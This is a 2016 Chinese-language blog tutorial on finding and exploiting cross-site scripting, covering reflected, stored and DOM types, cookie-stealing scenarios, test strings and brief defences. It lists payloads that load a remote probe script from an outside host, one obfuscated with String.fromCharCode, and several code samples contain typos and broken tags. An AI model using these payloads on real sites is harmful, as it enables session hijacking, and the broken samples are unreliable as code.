@@ -1,0 +1,181 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>xss的挖掘和利用 | liuqi</title>
+  <meta name="author" content="liuqi">
+  
+  <meta name="description" content="吃吃睡睡终其一生">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="xss的挖掘和利用"/>
+  <meta property="og:site_name" content="liuqi"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">liuqi</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-18T13:26:46.000Z"><a href="/2016/07/18/xss的挖掘和利用/">2016-07-18</a></time>
+      
+      
+  
+    <h1 class="title">xss的挖掘和利用</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>#什么是XSS#<br>即跨站脚本发生在浏览器上<br>为什么用户浏览器渲染整个html文档出现了不可预期的脚本指令并执行<br>跨站脚本重要的是脚本<br>对于网站是不可预期的，对于攻击者是可预期的<br>这类攻击主要是浏览器解析执行的，浏览器不是看到什么就解析什么，不符合规定就不会执行。浏览器安全策略：同源策略<br>漏洞挖掘</p>
+<ul>
+<li>1.用户提交的脚本指令</li>
+<li>2提交服务器脚本没有过滤完整</li>
+<li>3输出的时候<br>浏览器渲染解析你的指令就能执行</li>
+</ul>
+<p>#漏洞利用#<br>js可以获取什么，xss就可以获取什么<br>xss的危害：<br>获取管理员的cookie<br>xss worm<br>挂马（水坑攻击）<br>键盘记录（有局限性）<br>利用网站重定向<br>修改网页内容<br>攻击场景：<br>在各类的sns、邮件系统、开源流行的web应用、bbs、微博社交等，主要是一些大型的网站才有价值<br>支持html解析和javascript解析的客户端，如：html文档、flash、pdf等<br>form表单提交的内容出现在网页上 如：昵称、邮箱、简介、留言</p>
+<p>#同源策略：#</p>
+<p><a href="https://github.com/evilcos/xssprobe" target="_blank" rel="external">https://github.com/evilcos/xssprobe</a></p>
+<p>#xss分类#<br>反射型xss(非持久型)<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">反射型xss也被称为非持久型xss，是现在最容易出现的一种xss漏洞，xss代码出现在url中，最后输入提交到服务器中，服务器解析后响应出现这段xss代码，最后浏览器解析执行</div><div class="line">    简单的流程：</div><div class="line">用户访问带有xss代码的url请求</div><div class="line">服务器接收后处理，将返回的带有xss代码的数据发送给浏览器</div><div class="line">浏览器解析带有xss代码的数据后，最终造成xss漏洞</div><div class="line">可能攻击流程：</div><div class="line">    • 用户aaa在网站www.xxx.com浏览网页</div><div class="line">    • 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码，代码功能为盗取用户Cookie并发送到指定站点www.xxser.com</div><div class="line">    • hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击</div><div class="line">    • 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com</div><div class="line">    • hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息</div><div class="line"></div><div class="line"></div><div class="line">储存型xss</div><div class="line">存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动 触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被 XSS，其中最典型的例子就是留言板。</div><div class="line">区别在于：提交的xss代码会存储在服务器中，下次请求时就不用再提交xss代码</div><div class="line">留言板 </div><div class="line">&lt;code&gt;</div><div class="line">测试技巧：</div></pre></td></tr></table></figure></p>
+<pre><code>• 首先确定输入点和输出点，比如留言，若留言输出(显示)的地方是标签内，则XSS代码会被执行，但若输出在属性内，则不会执行，
+
+&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot; /&gt;
+在输入框中输入&lt;script&gt;alert(/xss/)&lt;script&gt;就可以测试
+• 确定输出点后根据相应的标签构造HTML代码来闭合，如：‘ /&gt;&lt;script&gt;alert(1)&lt;script&gt;&lt;’，最终在html中为：
+</code></pre><p> <script>alert(1)<script>&lt;”” /&gt;<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">测试步骤：</div></pre></td></tr></table></figure></p>
+<pre><code>• 添加正常留言，用firebug快速查找显示标签，若显示区域不在html属性内则可以直接使用XSS代码注入
+• 若不能得知内容输出的位置，可以使用模糊测试方案，XSS代码如下：
+    a. &lt;script&gt;alert(document.cookie)&lt;script&gt;  //普通注入
+    b. &quot; /&gt;&lt;script&gt;alert(document.cookie)&lt;script&gt;   //闭合标签注入
+    c. &lt;/textarea&gt;&apos;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;script&gt;   //闭合标签注入
+</code></pre><p></code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">#xss的检测#</div><div class="line"></div><div class="line">xss分为手工检测和软件自动检测</div><div class="line">手工检测：检测结果准确，但对于大型web来说费时费力</div><div class="line">软件检测：方便省力，但存在误报，且有写隐蔽的XSS无法检测出</div><div class="line">检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出</div><div class="line">1.手工检测</div></pre></td></tr></table></figure></p>
+<p><code><br>由输出位置：输入敏感字符，如“&lt;、&gt;”‘、’（）”等提交后查看html的源代码<br> 很多web应用程序源码不公开，在测试时不能的值输出位置，比如，有些留言本在留言后必须经过管理员审核才能显示，无法的值数据在后台管理页面处于何种状态，如：<br>    在标签中：<div>XSS Test</div><br>    在属性内：<input type="text" name="" /></p>
+<p>在输入框中输入content” value=”XSS Test<br>    这种情况通常采用输入”/&gt;XSS Test来测试。<br></code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">2.全自动检测xss</div><div class="line">这个就不用多说了工具上</div><div class="line">appscan,wvs,burpsuit等软件都可以有效的检测xss，还会检测其他的漏洞</div><div class="line">专业的xss扫描还有xssER、xssf等，还有专门扫描dom类型xss的web服务</div><div class="line"></div><div class="line">3.xss漏洞的挖掘</div><div class="line">&lt;code&gt;</div><div class="line">反射型xss:</div><div class="line">一般url参数中的值能够回显到html中，url的参数过滤不严谨</div><div class="line">存储型xss:</div><div class="line">可以提交内容</div><div class="line">提交内容可被管理员或其他用户看到</div><div class="line"></div><div class="line">&lt;/code&gt;</div><div class="line">4.xss一般就是闭合标签，和sql注入类似，常见payload如下：</div></pre></td></tr></table></figure></p>
+<p><code><br> <script src='http://b.ioio.pub/xss/probe.js'><script><br>• <img src=x onerror="s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js'";><br>• &lt;svg onload=s=createElement(‘script’);body.appendChild(s);s.src=’<a href="http://b.ioio.pub/xss/probe.js&gt;">http://b.ioio.pub/xss/probe.js&gt;</a><br>• <svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,112,114,111,98,101,46,106,115)) ><br></code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xss简单示例</div><div class="line">发射型xss实列</div></pre></td></tr></table></figure></p>
+<p>&lt;?php<br>  echo $_GET[‘x’];<br>提交：<br>/xss.php?x=  &lt; scri pt&gt;alert(1)<script><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务器解析时就会触发弹窗</div><div class="line"></div><div class="line">?&gt;</div><div class="line">下面是一段经典的DOM型XSS示例：</div></pre></td></tr></table></figure></p>
+<p><script><br>    var temp = document.URL; //获取URL<br>    var index = document.URL.indexOf(“content”);<br>    var par = temp.substrint(index);<br>    document.write(decodeURL(par)); //输入获取内容<script><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">上述代码的意思是获取URL中content参数的值，并且输出，若输入```http://www.xxx.com/dom.html?content=&lt;script&gt;alert(/xss/)&lt;script&gt;```，就会产生XSS漏洞。</div><div class="line"></div><div class="line">xss的防御</div><div class="line">使用htmlspecialchars()和hemlentities()将一些预定义的字符转换为html实体</div><div class="line">```&lt;?php</div><div class="line">              $html = $_GET[&apos;x&apos;];</div><div class="line">   if($html)&#123;</div><div class="line">echo htnlspecialchars($html）&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+</script></p>
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+  <div class="addthis addthis_toolbox addthis_default_style">
+    
+      <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+    
+    
+      <a class="addthis_button_tweet"></a>
+    
+    
+      <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+    
+    
+      <a class="addthis_button_pinterest_pinit" pi:pinit:layout="horizontal"></a>
+    
+    <a class="addthis_counter addthis_pill_style"></a>
+  </div>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js"></script>
+
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/18/xss的挖掘和利用/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Suche">
+    <input type="hidden" name="q" value="site:yoursite.com">
+  </form>
+</div>
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 liuqi
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
